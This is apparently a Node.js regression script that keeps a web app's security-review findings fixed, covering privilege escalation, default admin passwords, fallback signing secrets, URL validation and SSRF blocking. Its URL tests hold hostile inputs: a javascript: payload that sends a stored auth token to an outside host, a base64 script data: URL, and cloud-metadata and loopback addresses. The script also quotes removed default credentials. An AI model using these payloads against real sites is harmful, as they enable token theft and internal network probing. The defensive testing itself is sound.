/**
 * The security review's findings, each one held closed by a check.
 *
 * ── Why this exists as a script and not a note ───────────────────────────────
 *
 * Every fix here removes something — a fallback secret, an unguarded field, a
 * default password, a free-text URL. Removals are exactly the changes that come
 * back: nothing fails when one is undone, the feature still works, and the hole
 * reopens silently. So each is stated as a check that fails loudly.
 *
 * Two kinds of check, and the difference matters:
 *
 *   BEHAVIOUR — driven through the real controller against a throwaway
 *               database. What the endpoint actually does.
 *   SOURCE    — a pattern that must not reappear anywhere in the tree. Used
 *               where the thing being prevented is a way of WRITING something
 *               (a literal secret, a shadowed binding) rather than a request
 *               anyone can make.
 *
 * Run: npm run verify:security-fixes
 */
const path = require('path');
const fs = require('fs');
require('dotenv').config({ path: path.join(__dirname, '..', 'cred.env') });

const mysql = require('mysql2/promise');

const REAL_DB = process.env.DB_NAME || 'realto';
const DB = `${REAL_DB}_verify_security_fixes`;
if (DB === REAL_DB) { console.error('Refusing to run against the configured database.'); process.exit(1); }
process.env.DB_NAME = DB;
process.env.CACHE_PREFIX = 'verifysec';

const ROOT = path.join(__dirname, '..');

let pass = 0; let fail = 0;
const check = (label, ok, detail = '') => {
  console.log(`  ${ok ? '\x1b[32mPASS\x1b[0m' : '\x1b[31mFAIL\x1b[0m'}  ${label}${detail ? `\n        ${detail}` : ''}`);
  if (ok) pass += 1; else fail += 1;
};

/** Every .js file that ships, excluding node_modules and this script's kin. */
const sourceFiles = () => {
  const out = [];
  const walk = (dir) => {
    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
      const p = path.join(dir, entry.name);
      if (entry.isDirectory()) {
        if (!/node_modules|\.git|coverage|uploads/.test(p)) walk(p);
      } else if (entry.name.endsWith('.js')) out.push(p);
    }
  };
  ['server.js'].forEach((f) => out.push(path.join(ROOT, f)));
  ['platform', 'shared', 'services'].forEach((d) => walk(path.join(ROOT, d)));
  return out;
};

/**
 * The file's CODE, with comments blanked and line numbers preserved.
 *
 * Needed because every fix here is documented by a comment that quotes what was
 * removed — "it used to read `JWT_SECRET || 'super-secret-key'`" — and a naive
 * grep for the removed thing finds the explanation of its removal. Blanking
 * comments first is what makes "this pattern must not reappear" checkable
 * against a codebase that explains itself.
 */
const codeOf = (file) => {
  const src = fs.readFileSync(file, 'utf8');
  let out = '';
  let inBlock = false;
  let inLine = false;
  let quote = null;
  for (let i = 0; i < src.length; i += 1) {
    const c = src[i];
    const next = src[i + 1];
    if (c === '\n') { inLine = false; quote = null; out += c; continue; }
    if (inBlock) { if (c === '*' && next === '/') { inBlock = false; i += 1; out += '  '; } else out += ' '; continue; }
    if (inLine) { out += ' '; continue; }
    if (quote) {
      out += c;
      if (c === '\\') { out += src[i + 1] === '\n' ? '' : src[i + 1]; i += 1; continue; }
      if (c === quote) quote = null;
      continue;
    }
    if (c === '/' && next === '*') { inBlock = true; i += 1; out += '  '; continue; }
    if (c === '/' && next === '/') { inLine = true; out += ' '; continue; }
    if (c === "'" || c === '"' || c === '`') { quote = c; out += c; continue; }
    out += c;
  }
  return out;
};

const grepSource = (pattern, { exclude = [] } = {}) => sourceFiles()
  .filter((f) => !exclude.some((e) => f.includes(e)))
  .flatMap((f) => {
    const hits = [];
    codeOf(f).split('\n').forEach((line, i) => {
      if (pattern.test(line)) hits.push(`${path.relative(ROOT, f)}:${i + 1}`);
    });
    return hits;
  });

(async () => {
  const admin = await mysql.createConnection({
    host: process.env.DB_HOST, port: process.env.DB_PORT || 3306,
    user: process.env.DB_USER, password: process.env.DB_PASSWORD,
  });
  await admin.query(`DROP DATABASE IF EXISTS \`${DB}\``);
  await admin.query(`CREATE DATABASE \`${DB}\``);

  const run = (handler, req) => new Promise((resolve) => {
    let code = 200;
    const res = {
      status(c) { code = c; return res; },
      json(body) { resolve({ code, body }); return res; },
    };
    Promise.resolve(handler(req, res, (err) => resolve({ code: 500, body: { error: err } })))
      .catch((err) => resolve({ code: 500, body: { error: err } }));
  });

  // ── FINDING-01 ────────────────────────────────────────────────────────────
  console.log('\n── A company admin cannot promote an account to platform admin ──');
  const models = require('../services/user-service/src/models');
  const { sequelize, Company, User } = models;
  await sequelize.sync({ force: true });
  await require('../services/user-service/src/migrations/seedRolesAndPermissions')(models);
  const userController = require('../services/user-service/src/controllers/userController');

  await Company.create({ id: 1, name: 'Acme Homes', slug: 'acme', email: 'a@acme.test' });
  {
    const admin1 = await User.create({
      name: 'Bola', email: 'bola@acme.test', password: 'x', type: 'super_admin', company_id: 1,
    });
    const caller = { id: admin1.id, type: 'super_admin', company_id: 1, permissions: ['users.manage'] };

    const out = await run(userController.update, {
      user: caller, params: { id: String(admin1.id) }, body: { type: 'superior_admin' },
    });
    await admin1.reload();
    check('PUT /users/:id { type: "superior_admin" } on their own account is refused',
      out.code === 403 && admin1.type === 'super_admin',
      `HTTP ${out.code}; stored type "${admin1.type}"`);

    // The same field on somebody ELSE in their company.
    const staff = await User.create({
      name: 'Ada', email: 'ada@acme.test', password: 'x', type: 'employee', company_id: 1,
    });
    const other = await run(userController.update, {
      user: caller, params: { id: String(staff.id) }, body: { type: 'superior_admin' },
    });
    await staff.reload();
    check('...and on a colleague',
      other.code === 403 && staff.type === 'employee', `HTTP ${other.code}; "${staff.type}"`);

    // An ordinary edit still works — the guard must not be a wall.
    const ordinary = await run(userController.update, {
      user: caller, params: { id: String(staff.id) }, body: { name: 'Ada Okoro' },
    });
    await staff.reload();
    check('An ordinary edit still saves', ordinary.code === 200 && staff.name === 'Ada Okoro',
      `HTTP ${ordinary.code}; name "${staff.name}"`);

    // And the platform may still do it.
    const platform = { id: 999, type: 'superior_admin', isSuperiorAdmin: true, company_id: null };
    const allowed = await run(userController.update, {
      user: platform, params: { id: String(staff.id) }, body: { type: 'superior_admin' },
    });
    await staff.reload();
    check('A platform admin may still promote somebody',
      allowed.code === 200 && staff.type === 'superior_admin', `HTTP ${allowed.code}; "${staff.type}"`);
  }

  // ── FINDING-02 ────────────────────────────────────────────────────────────
  console.log('\n── There is no default platform-administrator password ──────────');
  {
    const bootstrapSource = codeOf(path.join(ROOT, 'services/user-service/src/migrations/bootstrap.js'));
    check('bootstrap.js contains no password literal',
      !/SUPER_ADMIN_PASSWORD\s*\|\|\s*'[^']+'/.test(bootstrapSource),
      'was: SUPER_ADMIN_PASSWORD || \'Superior@123456\'');
    check('...and does not print the password',
      !/console\.log\([^)]*\$\{DEFAULT_PASSWORD/.test(bootstrapSource)
      || /generated \? DEFAULT_PASSWORD/.test(bootstrapSource),
      'a generated development password may be shown once; a configured one never is');

    /*
     * The FINDING-01 block above promoted somebody to superior_admin, and
     * bootstrap returns early when one exists — so without this the production
     * check would pass for the wrong reason.
     */
    await User.destroy({ where: { type: 'superior_admin' }, force: true });

    const previous = process.env.NODE_ENV;
    process.env.NODE_ENV = 'production';
    delete require.cache[require.resolve('../services/user-service/src/migrations/bootstrap')];
    const bootstrap = require('../services/user-service/src/migrations/bootstrap');
    let threw = null;
    // No superior_admin exists in this throwaway database, so it will try.
    await bootstrap(models).catch((error) => { threw = error.message; });
    process.env.NODE_ENV = previous;
    check('Bootstrapping in production without SUPER_ADMIN_PASSWORD refuses',
      Boolean(threw && /SUPER_ADMIN_PASSWORD/.test(threw)), threw || 'it created an account');
  }

  // ── FINDING-03 ────────────────────────────────────────────────────────────
  console.log('\n── No signing key falls back to a literal in the source ─────────');
  {
    const hits = grepSource(/['"]super-secret-key['"]|['"]realto-session-secret['"]/, {
      exclude: ['scripts/'],
    });
    check('The fallback secrets are gone from the shipped code', hits.length === 0, hits.join(', '));

    delete require.cache[require.resolve('../shared/src/appSecret')];
    const { appSecret } = require('../shared/src/appSecret');
    const savedSecret = process.env.JWT_SECRET;
    const savedEnv = process.env.NODE_ENV;

    delete process.env.JWT_SECRET;
    process.env.NODE_ENV = 'production';
    let refused = false;
    try { appSecret(); } catch { refused = true; }
    check('appSecret() refuses to invent one outside development', refused);

    process.env.NODE_ENV = '';
    let refusedUnset = false;
    try { appSecret(); } catch { refusedUnset = true; }
    check('...including when NODE_ENV is not set at all', refusedUnset,
      'the environment most likely to have forgotten JWT_SECRET too');

    process.env.NODE_ENV = 'development';
    check('...and yields a development value when it is', typeof appSecret() === 'string');

    process.env.JWT_SECRET = savedSecret;
    process.env.NODE_ENV = savedEnv;
  }

  // ── FINDING-07 ────────────────────────────────────────────────────────────
  console.log('\n── No binding shadows the function it is initialised from ───────');
  {
    // `const jwtSecret = await jwtSecret()` — a temporal-dead-zone error that
    // only throws when the branch runs, which is how four auth endpoints came
    // to be dead in production while every smoke test passed.
    const hits = sourceFiles().flatMap((f) => {
      const out = [];
      codeOf(f).split('\n').forEach((line, i) => {
        const m = line.match(/\bconst\s+([A-Za-z_$][\w$]*)\s*=\s*(?:await\s+)?\1\s*\(/);
        if (m) out.push(`${path.relative(ROOT, f)}:${i + 1}  ${m[0].trim()}`);
      });
      return out;
    });
    check('No self-referencing const initialiser anywhere', hits.length === 0, hits.join('\n        '));
  }

  // ── FINDING-06 ────────────────────────────────────────────────────────────
  console.log('\n── A stored document URL cannot be anything but an upload ───────');
  {
    const { safeUploadUrl } = require('../shared/src/safeUrl');
    const refused = [
      "javascript:fetch('https://x/'+localStorage.getItem('realto-auth'))",
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      'http://res.cloudinary.com/x.png',
      'https://evil.test/receipt.png',
      'https://res.cloudinary.com@evil.test/x.png',
      'vbscript:msgbox(1)',
      '/etc/passwd',
    ];
    const leaked = refused.filter((u) => safeUploadUrl(u) !== null);
    check('javascript:, data:, http:, another host and a credentialed URL are all refused',
      leaked.length === 0, leaked.join(', '));
    check('...and a genuine Cloudinary URL is accepted',
      safeUploadUrl('https://res.cloudinary.com/demo/image/upload/v1/realto/proof.png') !== null);

    const financeSource = codeOf(path.join(ROOT, 'services/finance-service/src/controllers/financeController.js'));
    check('submitInvoiceReceipt validates rather than trims',
      !/const documentUrl = String\(req\.body\.document_url/.test(financeSource),
      'the raw-string version is what put a buyer\'s link in front of an approver');
  }

  // ── FINDING-08 ────────────────────────────────────────────────────────────
  console.log('\n── The server will not fetch a URL that points inside ───────────');
  {
    const { checkOutboundUrl } = require('../shared/src/safeUrl');
    const cases = [
      'https://169.254.169.254/latest/meta-data/',
      'https://127.0.0.1/',
      'https://10.0.0.5/',
      'https://192.168.1.1/',
      'https://localhost/',
      'https://[::1]/',
      'http://api.ng.termii.com/',
      'https://real-host@169.254.169.254/',
    ];
    const allowed = [];
    for (const url of cases) {
      // eslint-disable-next-line no-await-in-loop
      const verdict = await checkOutboundUrl(url);
      if (verdict.ok) allowed.push(url);
    }
    check('Metadata, loopback, private ranges, localhost and plain http are refused',
      allowed.length === 0, allowed.join(', '));

    const smsSource = fs.readFileSync(
      path.join(ROOT, 'services/user-service/src/controllers/smsSettingsController.js'), 'utf8',
    );
    check('...and the SMS settings controller calls the check on both paths',
      (smsSource.match(/checkOutboundUrl\(/g) || []).length >= 2,
      'saving a base URL and testing an unsaved one are two ways in');
  }

  // ── FINDING-09 / 10 / 18 ──────────────────────────────────────────────────
  console.log('\n── Patterns that must not come back ─────────────────────────────');
  {
    const tls = grepSource(/rejectUnauthorized:\s*false/);
    check('No database connection skips certificate verification', tls.length === 0, tls.join(', '));

    const logged = grepSource(/console\.log\([^)]*(Temporary Password|\$\{password\}|\$\{plainPassword\})/);
    check('No password is written to stdout', logged.length === 0, logged.join(', '));

    const rounds = grepSource(/bcrypt\.hash\([^,]+,\s*\d+\s*\)/);
    check('Every bcrypt cost comes from the shared policy', rounds.length === 0, rounds.join(', '));

    const weak = grepSource(/Math\.random\(\)/, { exclude: ['scripts/'] })
      .filter((hit) => /authController|passcode|token|otp/i.test(hit));
    check('No credential is generated from Math.random', weak.length === 0, weak.join(', '));
  }

  // ── FINDING-04 ────────────────────────────────────────────────────────────
  console.log('\n── An invoice cannot be created already settled ─────────────────');
  {
    const finance = require('../services/finance-service/src/models');
    // sync() without force: the user-service tables above stay as they are.
    await finance.sequelize.sync();
    const financeController = require('../services/finance-service/src/controllers/financeController');

    const staff = { id: 7, type: 'employee', company_id: 1, permissions: [] };
    const out = await run(financeController.invoiceCrud.create, {
      user: staff,
      query: {},
      body: {
        client_id: 99, amount: 1, status: 'paid', amount_paid: 1, company_id: 2, notes: 'fabricated',
      },
    });
    const created = out.body?.data ? await finance.Invoice.findByPk(out.body.data.id) : null;

    check('POST /invoices { status: "paid" } does not create a settled invoice',
      Boolean(created) && created.status !== 'paid',
      created ? `HTTP ${out.code}; stored status "${created.status}"` : JSON.stringify(out.body).slice(0, 120));

    check('...and company_id comes from the token, not the body',
      Boolean(created) && Number(created.company_id) === 1,
      created ? `company_id ${created.company_id} (the body asked for 2)` : '');

    // The endpoint must still work — a guard that refuses everything is not a fix.
    check('...while an ordinary invoice still saves',
      out.code === 201 && Boolean(created?.invoice_id), `HTTP ${out.code}; ref ${created?.invoice_id}`);

    await finance.sequelize.close();
  }

  // ── FINDING-05 ────────────────────────────────────────────────────────────
  console.log('\n── Approving a payment takes a permission, not a role shape ─────');
  {
    const routes = fs.readFileSync(path.join(ROOT, 'services/finance-service/src/routes/index.js'), 'utf8');
    const verify = routes.match(/router\.post\('\/receipts\/:id\/verify'[^\n]*/)[0];
    const reject = routes.match(/router\.post\('\/receipts\/:id\/reject'[^\n]*/)[0];
    check('/receipts/:id/verify is permission-gated',
      verify.includes("requirePermission('finance.invoices.manage')"), verify.trim());
    check('/receipts/:id/reject is permission-gated',
      reject.includes("requirePermission('finance.invoices.manage')"), reject.trim());
  }

  console.log(`\n  ${pass} passed, ${fail} failed\n`);
  await sequelize.close();
  await admin.query(`DROP DATABASE \`${DB}\``);
  await admin.end();
  process.exit(fail ? 1 : 0);
})().catch((err) => { console.error(err); process.exit(1); });
